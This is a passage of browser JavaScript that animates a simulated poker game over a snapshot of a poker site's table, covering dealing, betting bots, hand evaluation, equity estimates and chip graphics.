      var MAX = 5;                                     // keep the stack tidy
      var picks = [], rem = value, total = 0;
      for (var i = 0; i < CHIP_DENOMS.length && total < MAX; i++) {
        var d = CHIP_DENOMS[i];
        while (rem >= d[0] && total < MAX) { picks.push(d); rem -= d[0]; total++; }
      }
      if (!picks.length) picks.push(CHIP_DENOMS[CHIP_DENOMS.length - 1]);
      var step = em * 0.17;                            // overlap like a real stack
      var h = em * 0.9 + (picks.length - 1) * step;
      var html = '<span style="position:relative;display:inline-block;width:' + em +
        'em;height:' + h + 'em;vertical-align:middle;margin-right:.3em;flex:none;">';
      for (var k = 0; k < picks.length; k++) {
        var p = picks[picks.length - 1 - k];           // bottom = largest
        html += '<span style="position:absolute;left:0;bottom:' + (k * step) +
          'em;filter:drop-shadow(0 .02em .04em rgba(0,0,0,.5));">' +
          chipSvg(p[1], p[2], p[3], em) + '</span>';
      }
      return html + '</span>';
    }
    var RANKS = ['A', 'K', 'Q', 'J', '10', '9', '8', '7', '6', '5', '4', '3', '2'];

    // Gather occupied seats.
    var seats = [];
    for (var i = 0; i < 9; i++) {
      var seatEl = doc.querySelector('.r-seat.s-' + i);
      if (!seatEl) continue;
      var nameEl = seatEl.querySelector('.player-name');
      if (!nameEl || !nameEl.textContent.trim()) continue;
      seats.push({
        i: i,
        seatEl: seatEl,
        player: seatEl.querySelector('.r-player'),
        cashEl: seatEl.querySelector('.player-cash'),
        betEl: doc.querySelector('.r-player-bet.s-' + i + ' .r-player-bet-content'),
        stack: parseFloat((seatEl.querySelector('.player-cash') || {}).textContent ?
          seatEl.querySelector('.player-cash').textContent.replace(/,/g, '') : '0') || 0,
        bet: 0, folded: false
      });
    }
    if (seats.length < 2) return;

    // Hide the snapshot's baked-in action / position bubbles (Fold, BB, SB…)
    // and the static dealer button — the sim drives its own, rotating ones.
    doc.querySelectorAll('.player-action').forEach(function (el) { el.style.display = 'none'; });
    var dealerImg = '';
    var dealerSrc = doc.querySelector('.dealer-chip, .dealer-button');
    if (dealerSrc) dealerImg = dealerSrc.style.backgroundImage;
    doc.querySelectorAll('.dealer-chip, .dealer-button').forEach(function (el) { el.style.display = 'none'; });
    // Move the rotating dealer button onto a seat (CSS positions it per seat).
    function placeDealer(s) {
      doc.querySelectorAll('.tv-dealer').forEach(function (el) { el.remove(); });
      if (!s || !s.seatEl || !dealerImg) return;
      var d = doc.createElement('div');
      d.className = 'image dealer-chip tv-dealer';
      d.style.backgroundImage = dealerImg;
      d.style.display = '';
      d.style.zIndex = '6';
      s.seatEl.appendChild(d);
    }

    // ── busting out / buying back in ──────────────────────────────────────
    // hide the whole seat; the SEAT OPEN button lives inside the (hidden)
    // name bar with visibility:visible, so it lands on the seat's rail spot
    var PLAYER_PARTS = ['.r-player-avatar', '.r-player-cards', '.r-player-bar',
      '.r-rating-bar', '.icons', '.r-seat-timer', '.r-player-avatar-back-light'];
    function seatOpenBtn(anchor) {
      var btn = anchor.querySelector('.tv-seatopen');
      if (!btn) {
        btn = doc.createElement('div');
        btn.className = 'tv-seatopen';
        btn.innerHTML = 'SEAT<br>OPEN';
        btn.style.cssText = 'position:absolute;left:50%;top:50%;transform:translate(-50%,-50%);' +
          'width:4.9em;height:4.9em;border-radius:50%;background:rgba(40,42,58,.85);' +
          'border:.1em solid rgba(255,255,255,.38);color:#e6e8ee;font-weight:normal;' +
          'font-size:1em;line-height:1.15;display:flex;align-items:center;justify-content:center;' +
          'text-align:center;z-index:7;cursor:pointer;visibility:visible;box-shadow:0 .1em .4em rgba(0,0,0,.5);';
        btn.addEventListener('click', function (e) { e.stopPropagation(); tableSit(); });
        if (getComputedStyle(anchor).position === 'static') anchor.style.position = 'relative';
        anchor.appendChild(btn);
      }
      return btn;
    }
    function standUp(s) {                      // player ran out → empty seat
      s.out = true; s.folded = true; s.bet = 0;
      setBet(s); setAction(s, '');
      if (s.betEl) s.betEl.innerHTML = '';
      var host = s.player || s.seatEl;
      if (!host) return;
      PLAYER_PARTS.forEach(function (sel) {
        var e = host.querySelector(sel); if (e) e.style.visibility = 'hidden';
      });
      seatOpenBtn(host.querySelector('.r-player-bar') || host).style.display = 'flex';
    }
    function sitDown(s) {                       // a new player buys in & sits
      s.out = false; s.allIn = false; s.folded = false;
      s.stack = bb * (40 + Math.floor(Math.random() * 120));
      var host = s.player || s.seatEl;
      if (!host) return;
      // fresh identity so it reads as a new player coming in from outside
      var nmEl = host.querySelector('.player-name');
      if (nmEl) nmEl.textContent = TABLE_NAME_POOL[Math.floor(Math.random() * TABLE_NAME_POOL.length)];
      var avEl = host.querySelector('.r-player-avatar .Avatar');
      if (avEl) avEl.style.backgroundImage = 'url("' +
        avatarUrl(TABLE_AVATAR_POOL[Math.floor(Math.random() * TABLE_AVATAR_POOL.length)]) + '")';
      PLAYER_PARTS.forEach(function (sel) {
        var e = host.querySelector(sel); if (e) e.style.visibility = '';
      });
      host.querySelectorAll('.tv-seatopen').forEach(function (b) { b.style.display = 'none'; });
      if (s.seatEl) s.seatEl.style.opacity = '1';
      setStack(s);
    }
    // ── dealing / folding animation for hole cards ──────────────────────
    function boardCenter() {
      var r = (boardEl || doc.body).getBoundingClientRect();
      return { x: r.left + r.width / 2, y: r.top + r.height / 2 };
    }
    function towardCenter(c) {                  // transform that puts c on the board
      var ctr = boardCenter(), r = c.getBoundingClientRect();
      return 'translate(' + (ctr.x - (r.left + r.width / 2)) + 'px,' +
        (ctr.y - (r.top + r.height / 2)) + 'px) scale(.4)';
    }
    function dealCards() {                      // fly cards out from the dealer
      var order = [];
      for (var k = 1; k <= seats.length; k++) {
        var x = seats[(dealer + k) % seats.length];
        if (!x.out) order.push(x);
      }
      order.forEach(function (x, i) {
        var c = x.seatEl && x.seatEl.querySelector('.r-player-cards');
        if (!c) return;
        c.style.transition = 'none';
        c.style.transform = '';
        c.style.visibility = '';
        c.style.transform = towardCenter(c);
        c.style.opacity = '0';
        void c.offsetWidth;
        sfx(doc, 'card', 0.12 + i * 0.11);
        setTimeout(function () {
          c.style.transition = 'transform .45s ease-out, opacity .25s ease-out';
          c.style.transform = '';
          c.style.opacity = '1';
        }, 120 + i * 110);
      });
    }
    function showHoleCards(x) {                // two face-up cards above the name bar
      var pc = x.seatEl && x.seatEl.querySelector('.r-player-cards');
      if (!pc) return;
      var orig = pc.querySelector('.card-holder');
      if (orig) orig.style.display = 'none';
      var h = pc.querySelector('.tv-hole');
      if (!h) {
        h = doc.createElement('div');
        h.className = 'tv-hole';
        pc.appendChild(h);
      }
      // closed: two small backs peeking over the name bar (like the site)
      var bStep = holeN > 2 ? .5 : .71;          // small backs fan wider for Omaha
      h.style.cssText = 'position:absolute;left:' + (4.45 - (holeN - 2) * bStep / 2) + 'em;top:3.3em;' +
        'display:flex;white-space:nowrap;pointer-events:none;';
      x.hole = [];
      for (var hc = 0; hc < holeN; hc++) x.hole.push(drawCard());
      x.hand = preflopStrength(x.hole);
      x.revealed = false;
      x.score = null;
      setHandName(x, '');
      var fStep = holeN <= 2 ? 1.25 : holeN === 4 ? 1.05 : .85;   // visible slice of each card
      x.holeFaces = x.hole.map(function (c, i) {
        return card(i ? 'margin:0 0 0 ' + (fStep - 3.05) + 'em;' : 'margin:0;', c);
      }).join('');
      if (!cardBackBg) {                       // the site's own card back, from any seat
        var back = doc.querySelector('.r-player-cards .back');
        cardBackBg = back && back.style.backgroundImage;
      }
      var bg = cardBackBg;
      function cardBack(extra) {
        return '<div style="display:inline-block;width:1.83em;height:2.4em;border-radius:.12em;box-sizing:border-box;' +
          'border:.06em solid #fff;background:#7a1010 center/cover no-repeat;' +
          (bg ? 'background-image:' + bg.replace(/"/g, "'") + ';' : '') + extra + '"></div>';
      }
      var backs = '';
      for (var bi = 0; bi < holeN; bi++) backs += cardBack(bi ? 'margin-left:' + (bStep - 1.83) + 'em;' : '');
      h.innerHTML = backs;
    }
    var cardBackBg = null;
    function revealCards(x) {                  // turn a player's hole cards face up
      if (x.revealed || x.folded || x.out || !x.holeFaces) return;
      var h = x.seatEl && x.seatEl.querySelector('.tv-hole');
      if (!h) return;
      x.revealed = true;
      h.style.transition = 'transform .15s ease-in';
      h.style.transformOrigin = 'center';
      h.style.transform = 'scaleX(0)';
      setTimeout(function () {
        // open: two big cards side by side over the avatar, tucked behind the bar
        // same card, same size as the board cards
        var pc = h.parentNode, k = 1.25;
        try { k = parseFloat(getComputedStyle(boardEl).fontSize) / parseFloat(getComputedStyle(pc).fontSize) || k; } catch (e) {}
        h.style.cssText = 'position:absolute;left:50%;top:1.55em;display:flex;white-space:nowrap;' +
          'pointer-events:none;font-size:' + k + 'em;transform:translateX(-50%) scaleX(0);';
        h.innerHTML = x.holeFaces;
        void h.offsetWidth;
        h.style.transition = 'transform .15s ease-out';
        h.style.transform = 'translateX(-50%)';
      }, 150);
    }
    function revealLive() {
      seats.forEach(function (x) { revealCards(x); });
    }

    /* ── hand evaluation (real cards) ── */
    // card = [rank, suit]; RANKS runs A..2, so value = 14 - index
    function rv(c) { return 14 - RANKS.indexOf(c[0]); }
    function evalHand(cards) {                 // best 5 of up to 7 → comparable score
      var v = cards.map(rv), cnt = {}, bySuit = {};
      cards.forEach(function (c, i) {
        cnt[v[i]] = (cnt[v[i]] || 0) + 1;
        (bySuit[c[1][0]] = bySuit[c[1][0]] || []).push(v[i]);
      });
      function straightHigh(vals) {
        var u = {}; vals.forEach(function (x) { u[x] = 1; }); if (u[14]) u[1] = 1;
        for (var hi = 14; hi >= 5; hi--) {
          var ok = true; for (var k = 0; k < 5; k++) if (!u[hi - k]) { ok = false; break; }
          if (ok) return hi;
        }
        return 0;
      }
      var desc = function (a, b) { return b - a; };
      for (var su in bySuit) if (bySuit[su].length >= 5) {
        var sf = straightHigh(bySuit[su]);
        if (sf) return [8, sf];
      }
      var groups = Object.keys(cnt).map(Number).map(function (r) { return [cnt[r], r]; })
        .sort(function (a, b) { return b[0] - a[0] || b[1] - a[1]; });
      var kick = function (ex, n) {
        return v.filter(function (x) { return ex.indexOf(x) < 0; }).sort(desc)
          .filter(function (x, i, a) { return a.indexOf(x) === i; }).slice(0, n);
      };
      if (groups[0][0] === 4) return [7, groups[0][1]].concat(kick([groups[0][1]], 1));
      if (groups[0][0] === 3 && groups[1] && groups[1][0] >= 2) return [6, groups[0][1], groups[1][1]];
      for (su in bySuit) if (bySuit[su].length >= 5) return [5].concat(bySuit[su].sort(desc).slice(0, 5));
      var st = straightHigh(v);
      if (st) return [4, st];
      if (groups[0][0] === 3) return [3, groups[0][1]].concat(kick([groups[0][1]], 2));
      if (groups[0][0] === 2 && groups[1] && groups[1][0] === 2)
        return [2, groups[0][1], groups[1][1]].concat(kick([groups[0][1], groups[1][1]], 1));
      if (groups[0][0] === 2) return [1, groups[0][1]].concat(kick([groups[0][1]], 3));
      return [0].concat(kick([], 5));
    }
    function scoreHand(hole, bd) {             // Hold'em: any 5 of 7; Omaha: 2 hole + 3 board
      if (!omaha) return evalHand(hole.concat(bd));
      var best = null, i, j, a, b2, c;
      for (i = 0; i < hole.length; i++) for (j = i + 1; j < hole.length; j++)
        for (a = 0; a < bd.length; a++) for (b2 = a + 1; b2 < bd.length; b2++) for (c = b2 + 1; c < bd.length; c++) {
          var sc = evalHand([hole[i], hole[j], bd[a], bd[b2], bd[c]]);
          if (!best || cmpScore(sc, best) > 0) best = sc;
        }
      return best;
    }
    function cmpScore(a, b) {
      for (var i = 0; i < Math.max(a.length, b.length); i++) {
        var d = (a[i] || 0) - (b[i] || 0); if (d) return d;
      }
      return 0;
    }
    function rn(x) { return x === 14 ? 'A' : x === 13 ? 'K' : x === 12 ? 'Q' : x === 11 ? 'J' : String(x); }
    function handName(sc) {
      var r = sc.slice(1).map(rn);
      switch (sc[0]) {
        case 8: return sc[1] === 14 ? 'Royal flush' : 'Straight flush to ' + r[0];
        case 7: return 'Four of ' + r[0] + ' and ' + r[1];
        case 6: return 'Full house ' + r[0] + ' over ' + r[1];
        case 5: return 'Flush ' + r.join(' ');
        case 4: return 'Straight to ' + r[0];
        case 3: return 'Three of ' + r[0] + ' and ' + r.slice(1).join(' ');
        case 2: return 'Two pair ' + r[0] + ' and ' + r[1] + ', ' + r[2];
        case 1: return 'Pair of ' + r[0] + ' and ' + r.slice(1).join(' ');
        default: return r.join(' ');
      }
    }
    function preflopStrength(h) {              // 0..1 rough starting-hand value
      if (h.length > 2) {                      // Omaha: best two-card combo, slightly damped
        var m = 0;
        for (var i = 0; i < h.length; i++) for (var j = i + 1; j < h.length; j++)
          m = Math.max(m, preflopStrength([h[i], h[j]]));
        return clamp(m * 0.85 + 0.05, 0.02, 0.99);
      }
      var a = rv(h[0]), b = rv(h[1]), hi = Math.max(a, b), lo = Math.min(a, b);
      var sc = (hi - 2) / 12 * 0.45 + (lo - 2) / 12 * 0.2;
      if (a === b) sc += 0.3 + (a - 2) / 12 * 0.1;
      if (h[0][1] === h[1][1]) sc += 0.06;
      var gap = hi - lo; if (gap > 0 && gap <= 2) sc += 0.05 - gap * 0.01;
      return clamp(sc, 0.02, 0.99);
    }
    function equitySims(players, sims) {      // Monte Carlo win share per hand
      var known = boardCards.slice();
      players.forEach(function (h) { if (h) known = known.concat(h); });
      var rest = [];
      RANKS.forEach(function (r) { SUITS.forEach(function (su) {
        if (!known.some(function (c) { return c[0] === r && c[1] === su; })) rest.push([r, su]);
      }); });
      var wins = players.map(function () { return 0; });
      for (var t = 0; t < sims; t++) {
        var pool = rest.slice(), extra = [];
        var draw = function () { return pool.splice(Math.floor(Math.random() * pool.length), 1)[0]; };
        var hands = players.map(function (h) {
          if (h) return h;
          var o = []; for (var q = 0; q < holeN; q++) o.push(draw()); return o;
        });
        while (boardCards.length + extra.length < 5) extra.push(draw());
        var bd = boardCards.concat(extra), best = null, win = [];
        hands.forEach(function (h, i) {
          var sc = scoreHand(h, bd), c = best ? cmpScore(sc, best) : 1;
          if (c > 0) { best = sc; win = [i]; } else if (c === 0) win.push(i);
        });
        win.forEach(function (i) { wins[i] += 1 / win.length; });
      }
      return wins.map(function (w) { return w / sims; });
    }
    function equityVsField(hole, nOpp) {
      var ps = [hole]; for (var k = 0; k < Math.max(1, Math.min(nOpp, 3)); k++) ps.push(null);
      return clamp(equitySims(ps, omaha ? 40 : 120)[0] + (nOpp > 3 ? -0.03 * (nOpp - 3) : 0), 0.02, 0.99);
    }
    function seatBadge(x, cls, css) {           // small label hung on a seat's bar
      var bar = x.seatEl && x.seatEl.querySelector('.r-player-bar');
      if (!bar) return null;
      var el = bar.querySelector('.' + cls);
      if (!el) {
        el = doc.createElement('div'); el.className = cls; el.style.cssText = css;
        if (getComputedStyle(bar).position === 'static') bar.style.position = 'relative';
        bar.appendChild(el);
      }
      return el;
    }
    function setHandName(x, text) {            // "Pair of A and K 8 6" under the bar
      var el = seatBadge(x, 'tv-handname', 'position:absolute;left:50%;top:100%;transform:translate(-50%,-.25em);' +
        'background:#eef0f4;color:#111;font-weight:bold;font-size:.85em;padding:.05em .8em;border-radius:.45em;' +
        'white-space:nowrap;z-index:6;min-width:8em;text-align:center;');
      if (el) { el.textContent = text; el.style.display = text ? '' : 'none'; }
    }
    function showEquity() {                     // win % next to each all-in hand
      var live = seats.filter(function (x) { return !x.folded && !x.out && x.hole; });
      if (live.length < 2 || boardCards.length >= 5) { clearEquity(); return; }
      var eq = equitySims(live.map(function (x) { return x.hole; }), omaha ? 120 : 400);
      var ctr = boardCenter();
      live.forEach(function (x, i) {
        var av = x.seatEl.querySelector('.r-player-avatar') || x.seatEl;
        var r = av.getBoundingClientRect(), left = (r.left + r.width / 2) < ctr.x;
        var el = seatBadge(x, 'tv-equity', 'position:absolute;bottom:calc(100% + 3.2em);' +
          'background:#f7c96b;color:#222;font-size:.8em;padding:.1em .55em;border-radius:1em;z-index:6;');
        if (!el) return;
        el.style.left = left ? '-.4em' : 'auto'; el.style.right = left ? 'auto' : '-.4em';
        el.textContent = Math.round(eq[i] * 100) + '%'; el.style.display = '';
      });
    }
    function clearEquity() {
      Array.prototype.forEach.call(doc.querySelectorAll('.tv-equity'), function (e) { e.style.display = 'none'; });
    }
    function foldCards(x) {                     // mucked cards slide into the middle
      var c = x.seatEl && x.seatEl.querySelector('.r-player-cards');
      if (!c) return;
      c.style.transition = 'transform .5s ease-in, opacity .5s ease-in';
      c.style.transform = towardCenter(c);
      c.style.opacity = '0';
    }
    function nextActiveIdx(from) {
      for (var k = 1; k <= seats.length; k++) {
        var j = (from + k) % seats.length;
        if (!seats[j].out) return j;
      }
      return from;
    }

    var potEl = doc.querySelector('.bank-container-content');
    var boardEl = doc.querySelector('.r-table-cards .card-holder');
    var potChipsEl = null;
    if (boardEl) {                       // keep all 5 board cards on one row
      boardEl.style.width = '21em';
      boardEl.style.whiteSpace = 'nowrap';
      // the 5 card slots are fixed: the flop fills the left three and the
      // turn/river land to the right of it (like the real site)
      boardEl.style.textAlign = 'left';
      boardEl.style.boxSizing = 'border-box';
      boardEl.style.paddingLeft = '2.15em';
      // central pile where all the bet chips gather, just under the board
      potChipsEl = doc.createElement('div');
      // like the site: one dark pill (chips + short amount) centred right
      // under the table name
      potChipsEl.style.cssText = 'position:absolute;left:50%;top:6.6em;transform:translateX(-50%);' +
        'display:flex;align-items:center;gap:.3em;color:#fff;font-size:.8em;white-space:nowrap;';
      boardEl.appendChild(potChipsEl);
    }
    function shortMoney(v) {                   // 6000 → 6K, 1250000 → 1.25M
      function f(x) { return String(Math.round(x * 100) / 100); }
      if (v >= 1e6) return f(v / 1e6) + 'M';
      if (v >= 1e3) return f(v / 1e3) + 'K';
      return String(v);
    }
    function setPotChips(amount) {
      if (!potChipsEl) return;
      potChipsEl.innerHTML = amount > 0 ? chipStack(amount, 1.1) +
        '<span style="background:rgba(0,0,0,.45);padding:.08em .55em;border-radius:1em;">' + shortMoney(amount) + '</span>' : '';
      potChipsEl.style.display = amount > 0 ? 'flex' : 'none';
    }
    var logEl = (doc.querySelector('.chat-message') || {}).parentNode;

    var money = fmtMoney;
    function setBet(s) {
      if (!s.betEl) return;
      if (s._betShown === s.bet) return;   // unchanged → don't redraw (avoids chip flicker)
      s._betShown = s.bet;
      s.betEl.innerHTML = s.bet > 0
        ? '<span style="display:inline-flex;align-items:center;white-space:nowrap;font-size:.85em;">' + chipStack(s.bet) +
          '<span style="background:rgba(0,0,0,.55);color:#fff;font-weight:bold;padding:.08em .5em;border-radius:1em;">' + money(s.bet) + '</span></span>'
        : '';
    }
    function setStack(s) { if (s.cashEl) s.cashEl.textContent = money(s.stack); }
    // Show / hide an "All in" badge just below a player who has bet everything.
    // Show the last action (Check / Call / Raise / Fold / All in) as a pill
    // on the player. Pass no text to clear it.
    var ACTION_COLORS = {
      'Check': '#2e7d32', 'Call': '#2a6fd9', 'Bet': '#e08a1e',
      'Raise': '#e08a1e', 'Fold': '#c0392b', 'All in': '#8e1b1b'
    };
    function setAction(s, text) {
      // Pin the pill to the top edge of the name bar (just under the avatar),
      // the way the live site shows Fold / Bet / … .
      var host = (s.seatEl && s.seatEl.querySelector('.r-player-bar')) || s.player || s.seatEl;
      if (!host) return;
      if (getComputedStyle(host).position === 'static') host.style.position = 'relative';
      var badge = host.querySelector('.tv-action');
      if (!badge) {
        badge = doc.createElement('div');
        badge.className = 'tv-action';
        badge.style.cssText = 'position:absolute;left:50%;top:0;transform:translate(-50%,-50%);' +
          'z-index:8;color:#fff;font-weight:bold;font-size:.74em;padding:.1em .8em;' +
          'border-radius:1em;white-space:nowrap;box-shadow:0 .1em .3em rgba(0,0,0,.5);';
        host.appendChild(badge);
      }
      if (text) {
        badge.textContent = text;
        if (text === 'SB' || text === 'BB') {        // position badge: lavender
          badge.style.background = '#c3bbe8';
          badge.style.color = '#2a2340';
        } else {
          badge.style.background = ACTION_COLORS[text] || '#555';
          badge.style.color = '#fff';
        }
        badge.style.display = '';
      } else {
        badge.style.display = 'none';
      }
    }
    function setAllIn(s, on) { setAction(s, on ? 'All in' : ''); }
    // The snapshot bakes the red turn-timer bar into one seat only; clone it
    // into every seat so it follows whoever is acting.
    var timerTpl = doc.querySelector('.r-seat-timer');
    if (timerTpl) timerTpl = timerTpl.cloneNode(true);
    function seatTimer(x) {
      if (!x.player || !timerTpl) return null;
      var t = x.player.querySelector('.r-seat-timer');
      if (!t) { t = timerTpl.cloneNode(true); x.player.appendChild(t); }
      return t;
    }
    function setActive(s) {
      seats.forEach(function (x) {
        if (x.player) x.player.classList.remove('active');
        var t = x.player && x.player.querySelector('.r-seat-timer');
        if (t) t.style.display = 'none';
      });
      if (!s || !s.player) return;
      s.player.classList.add('active');
      var t = seatTimer(s), fill = t && t.querySelector('.fill');
      if (!t) return;
      t.style.display = '';
      if (fill) {                                   // count down until the next step
        fill.style.transformOrigin = 'left center';
        fill.style.transition = 'none';
        fill.style.transform = 'scaleX(1)';
        void fill.offsetWidth;
        fill.style.transition = 'transform 1.9s linear';
        fill.style.transform = 'scaleX(0)';
      }
    }
    function dim(s) { if (s.seatEl) s.seatEl.style.opacity = s.folded ? '0.45' : '1'; }
    function log(msg) {
      if (!logEl) return;
      var d = doc.createElement('div');
      d.className = 'chat-message dealer-message';
      d.innerHTML = '<span class="chat-author">Dealer:</span> <span class="chat-message-text">' + msg + '</span>';
      logEl.appendChild(d);
      while (logEl.children.length > 40) logEl.removeChild(logEl.firstChild);
      logEl.parentNode && (logEl.parentNode.scrollTop = logEl.parentNode.scrollHeight);
    }
    // Classic playing card: rank + suit top-left, large rank bottom-right.
    var deck = [];
    function shuffleDeck() {                    // fresh 52-card deck each hand
      deck = [];
      RANKS.forEach(function (r) { SUITS.forEach(function (su) { deck.push([r, su]); }); });
      for (var i = deck.length - 1; i > 0; i--) {
        var j = Math.floor(Math.random() * (i + 1)), t = deck[i]; deck[i] = deck[j]; deck[j] = t;
      }
    }
    function drawCard() { if (!deck.length) shuffleDeck(); return deck.pop(); }
    function card(extra, c) {
      c = c || drawCard();
      var r = c[0], su = c[1];
      var key = { '♠': 's', '♥': 'h', '♦': 'd', '♣': 'c' }[su[0]] + (r === '10' ? 'T' : r);
      if (CARD_IMG && CARD_IMG[key]) {
        return '<img src="' + CARD_IMG[key] + '" draggable="false" style="display:inline-block;width:3.05em;height:4.2em;' +
          'margin:0 .12em;vertical-align:middle;filter:drop-shadow(0 .08em .2em rgba(0,0,0,.45));' + (extra || '') + '">';
      }
      // one size for every rank; '10' is squeezed sideways instead of shrunk
      var big = 'font-size:2.4em;' + (r === '10' ? 'letter-spacing:-.06em;transform:scaleX(.78);transform-origin:right bottom;' : '');
      // Times has lining figures, so letters and digits share one baseline
      var bottom = '.08em';
      return '<div style="position:relative;display:inline-block;width:3.1em;height:4.2em;background:#fff;' +
        'border:.07em solid #444;border-radius:.22em;margin:0 .12em;vertical-align:middle;box-sizing:border-box;' +
        'box-shadow:0 .1em .3em rgba(0,0,0,.4);color:' + su[1] + ';font-family:\'Times New Roman\',Times,serif;' + (extra || '') + '">' +
          '<div style="position:absolute;left:.16em;top:.1em;font-size:1em;line-height:.95;text-align:center;">' +
            r + '<br><span style="font-size:1.1em;">' + su[0] + '</span></div>' +
          '<div style="position:absolute;right:.14em;bottom:' + bottom + ';line-height:1;' + big + '">' + r + '</div>' +
        '</div>';
    }

    var boardCards = [];
    var pot = 0, currentBet = 0, dealer = 0, board = 0, turn = 0, raises = 0, paused = false;
    function clamp(v, lo, hi) { return Math.max(lo, Math.min(hi, v)); }
    function roundBB(x) { return Math.max(bb, Math.round(x / bb) * bb); }

    function newHand() {
      // broke players stand up (seat opens); some empty seats get bought back
      seats.forEach(function (s) { if (!s.out && s.stack < bb) standUp(s); });
      seats.forEach(function (s) { if (s.out && Math.random() < 0.4) sitDown(s); });
      // never let the table die: keep at least 3 seated
      var activeCount = seats.filter(function (s) { return !s.out; }).length;
      for (var g = 0; g < seats.length && activeCount < 3; g++) {
        if (seats[g].out) { sitDown(seats[g]); activeCount++; }
      }

      seats.forEach(function (s) {
        s.bet = 0; s.allIn = false; s.folded = s.out;      // out seats sit the hand out
        setBet(s);
        if (!s.out) { setStack(s); dim(s); setAllIn(s, false); s.hand = Math.random(); }
        else if (s.seatEl) s.seatEl.style.opacity = '1';   // keep SEAT OPEN bright
      });
      if (boardEl) {                      // clear board cards but keep pot chips
        Array.prototype.slice.call(boardEl.children).forEach(function (c) {
          if (c !== potChipsEl) c.remove();
        });
      }
      board = 0; raises = 0; boardCards = [];
      dealer = nextActiveIdx(dealer);                       // D skips empty seats
      var sbIdx = nextActiveIdx(dealer), bbIdx = nextActiveIdx(sbIdx);
      var sbS = seats[sbIdx], bbS = seats[bbIdx];
      placeDealer(seats[dealer]);                           // move the D button round
      setAction(sbS, 'SB'); setAction(bbS, 'BB');
      sfx(doc, 'shuffle'); sfx(doc, 'sb', 0.5); sfx(doc, 'bb', 0.75);           // rotate the blinds
      sbS.bet = sb; sbS.stack -= sb; setBet(sbS); setStack(sbS);
      bbS.bet = bb; bbS.stack -= bb; setBet(bbS); setStack(bbS);
      pot = sb + bb; currentBet = bb;
      if (potEl) potEl.textContent = 'Pot: ' + money(pot); setPotChips(pot);
      turn = nextActiveIdx(bbIdx);
      // a player with no chips left (e.g. posted their last as a blind) is
      // already all-in for the hand — never let them "check"
      seats.forEach(function (s) {
        s.acted = false;
        if (!s.out && !s.folded && s.stack <= 0) { s.allIn = true; setAllIn(s, true); }
      });
      paused = false;
      shuffleDeck();
      seats.forEach(function (x) { if (!x.out) showHoleCards(x); });
      dealCards();
      log('New hand started');
    }

    function nextStreet() {
      // New street: clear the blinds (SB/BB) and last-street action labels,
      // but keep Fold and All in. The dealer button stays put for the hand.
      if (seats.some(function (s) { return s.bet > 0; })) sfx(doc, 'chips');   // bets swept into the pot
      seats.forEach(function (s) {
        s.bet = 0; setBet(s);
        if (!s.folded && !s.allIn) setAction(s, '');
      });
      currentBet = 0;
      board++;
      raises = 0;
      // nudge each hand's strength as the board develops (hits & misses)
      if (boardEl) {
        var n = board === 1 ? 3 : 1;   // flop = 3, turn/river = 1
        for (var k = 0; k < n; k++) {
          var bc = drawCard(); boardCards.push(bc);
          boardEl.insertAdjacentHTML('beforeend', card('', bc)); sfx(doc, 'flip', k * 0.09);
        }
      }
      // re-read each live hand against the real board (equity vs the field)
      var nOpp = seats.filter(function (x) { return !x.folded && !x.out; }).length - 1;
      seats.forEach(function (x) { if (!x.folded && !x.out && x.hole) x.hand = equityVsField(x.hole, nOpp); });
      if (seats.some(function (x) { return x.revealed; })) showEquity();
      log(board === 1 ? 'Flop' : board === 2 ? 'Turn' : 'River');
      turn = nextActiveIdx(dealer);
      seats.forEach(function (s) { s.acted = false; });
    }

    function showdown() {
      var live = seats.filter(function (s) { return !s.folded; });
      if (live.length > 1) { sfx(doc, 'show'); revealLive(); }
      clearEquity();
      var w = live[0] || seats[0], winners = [w];
      if (live.length > 1 && boardCards.length === 5) {
        // real showdown: best five of seven, ties split the pot
        var best = null;
        live.forEach(function (x) {
          x.score = scoreHand(x.hole, boardCards);
          setHandName(x, handName(x.score));
          var c = best ? cmpScore(x.score, best) : 1;
          if (c > 0) { best = x.score; winners = [x]; } else if (c === 0) winners.push(x);
        });
      }
      var share = Math.floor(pot / winners.length);
      winners.forEach(function (x, k) {
        x.stack += share + (k === 0 ? pot - share * winners.length : 0); setStack(x);
        log('<b>' + x.seatEl.querySelector('.player-name').textContent + '</b> wins (' + money(share) + ')' +
          (x.score && live.length > 1 ? ' with ' + handName(x.score) : ''));
      });
      sfx(doc, 'chips', live.length > 1 ? 0.5 : 0);
      pot = 0; if (potEl) potEl.textContent = 'Pot: ' + money(pot); setPotChips(0);
      setActive(null);
    }

    function roundDone() {
      // street is over once every live player has acted and matched the bet
      // (or is all-in)
      return seats.filter(function (s) { return !s.folded; })
        .every(function (s) { return s.allIn || (s.acted && s.bet === currentBet); });
    }
    function endHand() {
      paused = true; setActive(null);
      var shown = seats.filter(function (x) { return !x.folded; }).length > 1;
      setTimeout(function () {
        showdown();
        // leave the turned-over hands on screen for a moment at showdown
        setTimeout(function () { newHand(); }, shown ? 3200 : 1000);
      }, 350);
    }
    function advanceStreet() {
      paused = true; setActive(null);
      var live = seats.filter(function (x) { return !x.folded; });
      if (live.length > 1 && live.filter(function (x) { return !x.allIn; }).length <= 1) {
        if (!live.every(function (x) { return x.revealed; })) sfx(doc, 'show');
        revealLive();                         // all in: everyone's cards go face up
        if (board < 3) setTimeout(showEquity, 320);
      }
      if (board >= 3) { endHand(); }
      else setTimeout(function () { paused = false; nextStreet(); }, 650);
    }

    function step() {
      if (paused) return;
      var live = seats.filter(function (s) { return !s.folded; });
      if (live.length <= 1) { endHand(); return; }        // everyone else folded
      if (roundDone()) { advanceStreet(); return; }        // betting round complete

      // next player who can actually act (skip folded, all-in and chip-less)
      var guard = 0, s;
      do {
        s = seats[turn]; turn = (turn + 1) % seats.length; guard++;
        if (!s.folded && !s.allIn && s.stack <= 0) { s.allIn = true; setAllIn(s, true); }
      } while ((s.folded || s.allIn) && guard < 40);
      if (s.folded || s.allIn) { advanceStreet(); return; }

      setActive(s);
      var name = s.seatEl.querySelector('.player-name').textContent;
      var toCall = Math.max(0, currentBet - s.bet);

      // ── bot decision: hand strength + pot odds + position + street ──
      var st = clamp(s.hand + (Math.random() * 0.16 - 0.08), 0, 1);   // noisy read
      var preflop = board === 0;
      var pos = ((s.i - dealer + seats.length) % seats.length) / seats.length; // 0=early..late
      st += pos * 0.05;                                   // small positional boost
      var callCost = Math.min(toCall, s.stack);
      var odds = callCost / (pot + callCost || 1);        // price to call
      var allInToCall = callCost >= s.stack;

      // helper actions
      function doFold() { s.folded = true; dim(s); setBet(s); setAction(s, 'Fold'); foldCards(s); sfx(doc, 'fold'); log(name + ' folds'); }
